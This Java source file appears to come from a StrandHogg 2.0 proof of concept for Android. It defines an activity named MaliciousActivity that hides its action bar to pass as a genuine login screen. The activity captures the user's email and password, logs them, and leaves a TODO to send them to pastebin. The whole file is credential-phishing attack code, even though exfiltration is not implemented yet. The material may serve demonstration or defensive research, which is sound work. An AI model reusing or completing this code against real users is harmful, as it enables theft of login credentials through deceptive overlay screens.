package com.strandhogg.v2;

import androidx.appcompat.app.ActionBar;
import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.widget.EditText;

public class MaliciousActivity extends AppCompatActivity {

    public static final String ACTIVITY_TAG = "MaliciousActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_malicious);
        ActionBar supportActionBar = getSupportActionBar();
        if (supportActionBar != null) {
            supportActionBar.hide();
        }
    }

    public void logUsernamePassword(View view)
    {
        EditText emailAddressTxtBox = findViewById(R.id.editTextTextEmailAddress);
        EditText passwordTxtBox = findViewById(R.id.editTextTextPassword);
        String email = emailAddressTxtBox.getText().toString();
        String password = passwordTxtBox.getText().toString();
        Log.e(ACTIVITY_TAG, "********************************************************");
        Log.e(ACTIVITY_TAG, "Captured email and password: " + email + ", " + password);
        Log.e(ACTIVITY_TAG, "********************************************************");
        // TODO make pastebin request
    }
}